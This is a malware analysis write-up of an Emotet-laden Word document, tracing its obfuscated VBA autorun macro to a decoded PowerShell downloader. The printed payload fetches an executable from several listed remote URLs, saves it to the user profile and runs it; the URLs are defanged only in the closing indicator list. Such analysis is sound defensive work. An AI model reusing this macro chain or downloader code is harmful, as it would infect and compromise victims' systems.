# Emotet

# 1. Word Document:

```r
λ file maldoc.doc
maldoc.doc: Composite Document File V2 Document, Little Endian, Os: Windows, 
Version 6.2, Code page: 1252, Title: Nihil., Author: Anas Colin, 
Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word,
Create Time/Date: Wed Sep 23 10:30:00 2020, Last Saved Time/Date: Wed Sep 23 10:30:00 2020, 
Number of Pages: 1, Number of Words: 2234, Number of Characters: 12736, Security: 0

MD5: 32bdbd1a5c125c5c1978f0f822788300
SHA256: be9534491888cff3e8f85a3833a340d076f227ce551084aa2d7b32dff5561a31
```

File format is **Composite Document File V2 Document** which means MS’s OLE2.0 (object linking & embedding) Format. When using the OLE2.0 Format, the container application creates an OLE Compound File Storage object for each linked object or embedded object. The format allows the files to contain linked or embedded objects that are being assembled as individual streams (files) and storage (folder)

> Utility like zip can decompress this file to get executable files and their components to analysis.
> 

```objectivec
λ ls -lR maldoc                                                                     
total 101                                                                           
-rw-rw-rw-   1 user     group        7731 Jan 15  2023 1Table                       
-rw-rw-rw-   1 user     group       72217 Jan 15  2023 Data                         
drwxrwxrwx   1 user     group           0 Sep 23  2020 Macros // this file has macro
-rw-rw-rw-   1 user     group       18478 Jan 15  2023 WordDocument                 
-rw-rw-rw-   1 user     group         114 Jan 15  2023 [1]CompObj                   
-rw-rw-rw-   1 user     group         352 Jan 15  2023 [5]DocumentSummaryInformation
-rw-rw-rw-   1 user     group         416 Jan 15  2023 [5]SummaryInformation        
                                                                                    
maldoc\Macros=: 
total 2                                                                             
drwxrwxrwx   1 user     group           0 Sep 23  2020 Bkc5re_xxwma                 
-rw-rw-rw-   1 user     group         523 Jan 15  2023 PROJECT                      
-rw-rw-rw-   1 user     group          80 Jan 15  2023 PROJECTwm                    
drwxrwxrwx   1 user     group           0 Sep 23  2020 VBA                          
                                                                                    
maldoc\Macros\Bkc5re_xxwma=:                                                        
total 4                                                                             
-rw-rw-rw-   1 user     group          97 Jan 15  2023 [1]CompObj                   
-rw-rw-rw-   1 user     group         296 Jan 15  2023 [3]VBFrame                   
-rw-rw-rw-   1 user     group         434 Jan 15  2023 f                            
-rw-rw-rw-   1 user     group         508 Jan 15  2023 o                            
                                                                                    
maldoc\Macros\VBA=:                                                                 
total 46                                                                            
-rw-rw-rw-   1 user     group       24200 Jan 15  2023 Bkc5re_xxwma                 
-rw-rw-rw-   1 user     group        1684 Jan 15  2023 S88ecjif1ml6                 
-rw-rw-rw-   1 user     group       13993 Jan 15  2023 _VBA_PROJECT                 
-rw-rw-rw-   1 user     group        1533 Jan 15  2023 __SRP_0                      
-rw-rw-rw-   1 user     group         106 Jan 15  2023 __SRP_1                      
-rw-rw-rw-   1 user     group         304 Jan 15  2023 __SRP_2                      
-rw-rw-rw-   1 user     group         103 Jan 15  2023 __SRP_3                      
-rw-rw-rw-   1 user     group         838 Jan 15  2023 dir
```

U can see this file contains vba macro. When i use `oledir` tools (display all the directory entries of an OLE file)

```objectivec
λ oledir.exe maldoc.doc
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file maldoc.doc:
----+------+-------+----------------------+-----+-----+-----+--------+------   
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size     
----+------+-------+----------------------+-----+-----+-----+--------+------   
0   |<Used>|Root   |Root Entry            |-    |-    |2    |D9      |7872     
1   |<Used>|Stream |Data                  |-    |-    |-    |25      |72217    
2   |<Used>|Stream |1Table                |1    |23   |-    |B3      |7731     
3   |<Used>|Stream |WordDocument          |-    |-    |-    |0       |18478    
4   |<Used>|Stream |\x05SummaryInformation|3    |5    |-    |28      |416      
5   |<Used>|Stream |\x05DocumentSummaryInf|-    |-    |-    |22      |352      
    |      |       |ormation              |     |     |     |        |         
6   |<Used>|Storage|Macros                |-    |-    |21   |0       |0        
7   |<Used>|Storage|VBA                   |-    |22   |14   |0       |0        
8   |<Used>|Stream |S88ecjif1ml6          |11   |12   |-    |0       |1684     
9   |<Used>|Stream |__SRP_2               |15   |-    |-    |1B      |304      
10  |<Used>|Stream |__SRP_3               |9    |8    |-    |20      |103      
11  |<Used>|Stream |Bkc5re_xxwma          |-    |-    |-    |E2      |24200    
12  |<Used>|Stream |_VBA_PROJECT          |-    |-    |-    |116     |13993    
13  |<Used>|Stream |dir                   |-    |-    |-    |6D      |838      
14  |<Used>|Stream |__SRP_0               |13   |10   |-    |30      |1533     
15  |<Used>|Stream |__SRP_1               |-    |-    |-    |48      |106      
16  |<Used>|Storage|Bkc5re_xxwma          |-    |-    |18   |0       |0        
17  |<Used>|Stream |f                     |-    |-    |-    |4A      |434      
18  |<Used>|Stream |o                     |17   |19   |-    |4B      |508      
19  |<Used>|Stream |\x01CompObj           |-    |20   |-    |59      |97       
20  |<Used>|Stream |\x03VBFrame           |-    |-    |-    |5B      |296      
21  |<Used>|Stream |PROJECTwm             |7    |16   |-    |60      |80       
22  |<Used>|Stream |PROJECT               |-    |-    |-    |62      |523      
23  |<Used>|Stream |\x01CompObj           |6    |4    |-    |6B      |114      
----+----------------------------+------+--------------------------------------
id  |Name                        |Size  |CLSID                                 
----+----------------------------+------+--------------------------------------
0   |Root Entry                  |-     |00020906-0000-0000-C000-000000000046  
    |                            |      |Microsoft Word 97-2003 Document       
    |                            |      |(Word.Document.8)                     
23  |\x01CompObj                 |114   |                                      
5   |\x05DocumentSummaryInformati|352   |                                      
    |on                          |      |                                      
4   |\x05SummaryInformation      |416   |                                      
2   |1Table                      |7731  |                                      
1   |Data                        |72217 |                                      
6   |Macros                      |-     |
16  |  Bkc5re_xxwma              |-     |
19  |    \x01CompObj             |97    |
20  |    \x03VBFrame             |296   |
17  |    f                       |434   |
18  |    o                       |508   |
22  |  PROJECT                   |523   |
21  |  PROJECTwm                 |80    |
7   |  VBA                       |-     |
11  |    Bkc5re_xxwma            |24200 |
8   |    S88ecjif1ml6            |1684  |
12  |    _VBA_PROJECT            |13993 |
14  |    __SRP_0                 |1533  |
15  |    __SRP_1                 |106   |
9   |    __SRP_2                 |304   |
10  |    __SRP_3                 |103   |
13  |    dir                     |838   |
3   |WordDocument                |18478 |
```

The tree structure output show several interesting objects within the Macrots directory.

- **Bkc5re_xxwma:** this randomly named object includes child streams **f** and **o**. It’s indicated a form object (in Office document, it often used to store hidden variables and strings).
- **S88ecjif1ml6:** Another randomly named stream within the VBA Macro and certainly looks suspicious as well.

Lets use `oleid` to detect specific characteristics usually found in malicious files (Ex detect VBA macros)

```objectivec
λ oleid.exe maldoc.doc
oleid 0.60.dev1 - http://decalage.info/oletools
Filename: maldoc.doc
			...
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                    |                    |          |macros. Suspicious
                    |                    |          |keywords were found. Use
                    |                    |          |olevba and mraptor for
                    |                    |          |more info.
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.
--------------------+--------------------+----------+--------------------------
			...
```

Then extract VBA code with the help of `olevba`

```objectivec
olevba 0.60 on Python 3.7.9 - http://decalage.info/python/oletools
===============================================================================
FILE: maldoc.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO S88ecjif1ml6 
in file: maldoc.doc - OLE stream: 'S88ecjif1ml6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
Wdggt43espeaai75g_ = Array(Tku0cz3_kk0tufj + "Vi4gxn59xnxkzzm15Rxleer34r5t8v Tobvo57prwmzbrlw9" + Skrxs1elp57_o, U3tlx2laojf13ppk, Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz, W8khkof7lrcpbtr + "P7k0a_g9z8ir Y17elacettooplkjw Szsgtfms72msn Rdn3hl2todcn")
End Sub
-------------------------------------------------------------------------------
VBA MACRO Bkc5re_xxwma 
in file: maldoc.doc - OLE stream: 'Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Xy1ql8qq3m9fwoxvz()
On Error Resume Next
   Set mnnlkNhuiqgbjkas = ProtectedViewWindows
TGTnmafMf = Mid(Ku501j_z8xdfynpsw + Iwntuhm_mdji, 91, 1)
KQXpqbBVXw = Mid(Mkyf2sg5x9vmg25jq + Iwntuhm_mdji, 9, 1)
lRzndUz = Mid(Jemp8kitrmmipi5kl + Iwntuhm_mdji, 187, 1)
DZYRouLDX = Mid(Ei4m37xbevr + Iwntuhm_mdji, 32, 1)
CRfUmzi = Mid(Ip9vfrrcoo9ia + Iwntuhm_mdji, 213, 1)
	...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Ny3av00ll97ltoy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Wmyd37gtxrphjkb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Tahoma;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Fskdm2zvwtdesh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Tahoma�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Gg6xs1_7x7ja
-------------------------------------------------------------------------------
VBA FORM Variable "b'Urer04ndu5q_jgnt0'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Ny3av00ll97ltoy'
-------------------------------------------------------------------------------
VBA FORM Variable "b'G9296_zlvb28jru8'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Wmyd37gtxrphjkb'
-------------------------------------------------------------------------------
VBA FORM Variable "b'M3sl9apgyan8k'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'P'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Vo_3ycaurbu'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Fskdm2zvwtdesh'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ptvl917_3fhv4ghbhb'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'tar'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ct8nqi_rrjku1h0h'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ys_jgil82mmhf'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'tu'
-------------------------------------------------------------------------------
VBA FORM Variable "b'E8qursw9anoz'" IN 'maldoc.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Gg6xs1_7x7j'
// just sumary table of scan result
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|showwindow          |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

That code for both VBA macro “S88ecjif1ml6” and “Bkc5re_xxwma” look quite obfuscated. Beside that, we see sone of the strings and variables associated with the form (`VBA FORM STRING` IN and `VBA FORM Variable`).

As we can see table above, Macro automatically executes when the document is opened. The keyword “Create” commonly associated with creating a new process using WMI. And 2 terms relatively to string encoding & obfuscation.

# 2. VBA code:

For futher analysis, we export result to the file

```objectivec
olevba maldoc.doc > olevba_maldoc.txt
```

> U should split 2 windows side-to-side macro code and VBA FORM. Enable word wrap.
> 

![Untitled](Emotet%20ea8f117c439849cc9ae79b7581446185/Untitled.png)

## 2.1. VBA macro S88ecjif1ml6:

```visual-basic
Private Sub Document_open()
Wdggt43espeaai75g_ = Array(Tku0cz3_kk0tufj + "Vi4gxn59xnxkzzm15Rxleer34r5t8v Tobvo57prwmzbrlw9" + Skrxs1elp57_o, U3tlx2laojf13ppk, Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz, W8khkof7lrcpbtr + "P7k0a_g9z8ir Y17elacettooplkjw Szsgtfms72msn Rdn3hl2todcn")
End Sub
```

There is a `Document_open` method, which is the entrypoint for the code to execute.The other thing that it reference to the macro function `Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz` in VBA macro `Bkc5re_xxwma`.

## 2.2. VBA macro **Bkc5re_xxwma:**

![Untitled](Emotet%20ea8f117c439849cc9ae79b7581446185/Untitled%201.png)

There are 4 funcs. U notice that the first arg of `Mid` function call just a junk variable name has no reference inside local function definition. So, we remove all line has`BrjMGGrzYB`, `nVFWYX`, `wMGGAO` line has `Set` instruction.

Some vars like `Bkc5re_xxwma.Ptvl917_3fhv4ghbhb` does not exist within the current funct. But they appear in Forms document, so we need to replace them.

![Untitled](Emotet%20ea8f117c439849cc9ae79b7581446185/Untitled%202.png)

Next step, clean the code. 

```visual-basic
VBA MACRO S88ecjif1ml6 
in file: maldoc.doc - OLE stream: 'S88ecjif1ml6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
Wdggt43espeaai75g_ = Array(Tku0cz3_kk0tufj + "Vi4gxn59xnxkzzm15Rxleer34r5t8v Tobvo57prwmzbrlw9" + Skrxs1elp57_o, U3tlx2laojf13ppk, Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz, W8khkof7lrcpbtr + "P7k0a_g9z8ir Y17elacettooplkjw Szsgtfms72msn Rdn3hl2todcn")
End Sub
-------------------------------------------------------------------------------
VBA MACRO Bkc5re_xxwma 
in file: maldoc.doc - OLE stream: 'Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Xy1ql8qq3m9fwoxvz()
On Error Resume Next
G6_e19me06ggh9 = ", A :, A :w, A :i, A :nm, A :, A :gm, A :t, A :, A :" + "s" + ", A :, A ::, A :w, A :in, A :, A :3, A :2, A :_, A :" + "P" + ", A :ro, A :, A :ce, A :s, A :s, A :"
Rbgd8kh364erl = Jc1yuw7r38_4a5(G6_e19me06ggh9)
Set Ioyv20u9cnhfyah = CreateObject(Rbgd8kh364erl)
Ivvt_2x4qmasd8 = Q0cawbk07t3 + Rbgd8kh364erl + "startu"
Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5(Ivvt_2x4qmasd8 + "P")
Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
End Function

Function Jgcwzg_v1lujky5(Aat9psb6y4z_4fy)
On Error Resume Next
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Jgcwzg_v1lujky5. _
showwindow = wdKeyEquals - wdKeyEquals
End Function

Function Jc1yuw7r38_4a5(Brqcqtzjby3rhyk)
On Error Resume Next
Rkkl4izp8yq037 = CleanString(Brqcqtzjby3rhyk)
Lhene6fi97ra = Split(Rkkl4izp8yq037, ", A :")
Ox239biw5eyqve87i = Join(Lhene6fi97ra, D1vtk4ty75k5z)
Jc1yuw7r38_4a5 = Ox239biw5eyqve87i
End Function

Function Dlhbagxwt5vvo7ur()
On Error Resume Next
Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
Ah_ap6yelik = Right(Bg6i7gcz1j38udj0, Len(Bg6i7gcz1j38udj0) - 1)
Dlhbagxwt5vvo7ur = Jc1yuw7r38_4a5("POWeRsHe" + Ah_ap6yelik)
End Function

```

The funct `Jc1yuw7r38_4a5` just split param with delimeter `“, A :”` and join them all, same as remove all `“, A :”` in string param. with above given param, we obtain return val is "winmgmts:win32_Process”. After that:

```visual-basic
Function Xy1ql8qq3m9fwoxvz()
On Error Resume Next
Set Ioyv20u9cnhfyah = CreateObject("winmgmts:win32_Process")
Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5("winmgmts:win32_ProcessstartuP")
Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
End Function
```

It creats a win32_process object, then **Create** method of the win32_process is being called, with argument `Dlhbagxwt5vvo7ur` is a function in the bottom of code. In this function, the VBA stream `S88ecjif1ml6` has been use to get content from the word document.

```visual-basic
Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
```

```visual-basic
strings -n 400 maldoc.doc > strings_.txt
λ python
>>> fin = open("strings_.txt", "r")
>>> buf = fin.read()
>>> fin.close()
>>> buf = buf.replace(", A :", "")
>>> fout = open("res_.txt", "w")
>>> fout.write(buf)
>>> fout.close()
```

res_.txt. with `-ENCOD` , that look like base64 encoded payload

```
LL -ENCOD
JABQAGgAYQA5AG4AOABzAD0AKAAnA...
```

Use cyberchef to decode the payload.  After decode from base64 and remove all null byte, we use the follow recipes :

```python
payload.replace("')+('","").replace("'+'", "").replace("`", "").replace("'+('", "").replace("')+'", "").replace(";", "\n")
```

The payload:

```python
$Pha9n8s=('Ql8o_fh'))
.('new-item') $ENV:UseRPROFIlE\Wg__3MD\vPny24V\ -itemtype DIRECtOrY
[Net.ServicePointManager]::"secuRItYprOtoCol" = ('tls12, tls11, tls')
$Lnc8cly = (('Zc1o6l'))
$Havkcad=('R31m6l2'))
$Pe1ern2=$env:userprofile+((('KbQWg__3mdKbQVpny24vKbQ')  -RePLACe  ('KbQ'),[cHar]92)+$Lnc8cly+(('.exe')
$Zz6nqp1=('Sinyych'))
$E72wbda=.('new-object') nET.webcLieNT
$Mnvn2cb=(('http://prestokitchens.com/recurringo/fRe/*http://www.djraisor.com/error/w7G3/*http://dakarbuzz.net/css/CyKg/*https://wildecapitalmgmt.net/wp-content/j6/*http://californiaasa.com/californiaasa.com/8t/*http://viralbrown.com/e3c0ngfjc/N/*http://kharazmischl.com/w/')."sPliT"([char]42)
$Gq184xp=('N3jwk4m'))
foreach($Iyzvv5k in $Mnvn2cb){try{$E72wbda."dOwNLOadfIlE"($Iyzvv5k, $Pe1ern2)
$G52za0l=('Hpv6yp7'))
If ((&('Get-Item') $Pe1ern2)."LeNgTH" -ge 31777) {&('Invoke-Item')($Pe1ern2)
$Gcpv6rm=('T5zgd77'))
break
$Rp6msrl=(('Wwncvrd')}}catch{}}$Rcb29dp=('Kqkexzh')
```

Let clean the code more

```python
.('new-item') $ENV:UseRPROFIlE\Wg__3MD\vPny24V\ -itemtype DIRECtOrY
[Net.ServicePointManager]::"secuRItYprOtoCol" = ('tls12, tls11, tls')
$Pe1ern2=$env:userprofile+(('KbQWg__3mdKbQVpny24vKbQ')  -RePLACe  ('KbQ'),"\\") + 'Zc1o6l'+(('.exe')
$E72wbda=.('new-object') nET.webcLieNT
$Mnvn2cb=(('http://prestokitchens.com/recurringo/fRe/*http://www.djraisor.com/error/w7G3/*http://dakarbuzz.net/css/CyKg/*https://wildecapitalmgmt.net/wp-content/j6/*http://californiaasa.com/californiaasa.com/8t/*http://viralbrown.com/e3c0ngfjc/N/*http://kharazmischl.com/w/')."sPliT"([char]42)
foreach($Iyzvv5k in $Mnvn2cb){try{$E72wbda."dOwNLOadfIlE"($Iyzvv5k, $Pe1ern2)
If ((&('Get-Item') $Pe1ern2)."LeNgTH" -ge 31777) {&('Invoke-Item')($Pe1ern2)
break
$Rp6msrl=(('Wwncvrd')}}catch{}}$Rcb29dp=('Kqkexzh')
```

It initializes a .NET web client using tls12, tls11, tls security protocols, loop through url list try to download if size ≥ 31777 bytes and save to exe file. Then invoke (execute) this file.

> This downloaded file mabe Emotet trojan, which will then reach out the C2 infrastructure and give the attacker control over the system using the variety of features that come with the tool.
> 

The url list

```
hxxp[://]prestokitchens[.]com/recurringo/fRe/
hxxp[://]www[.]djraisor[.]com/error/w7G3/
hxxp[://]dakarbuzz[.]net/css/CyKg/
hxxps[://]wildecapitalmgmt[.]net/wp-content/j6/
hxxp[://]californiaasa[.]com/californiaasa[.]com/8t/
hxxp[://]viralbrown[.]com/e3c0ngfjc/N/
hxxp[://]kharazmischl[.]com/w/
```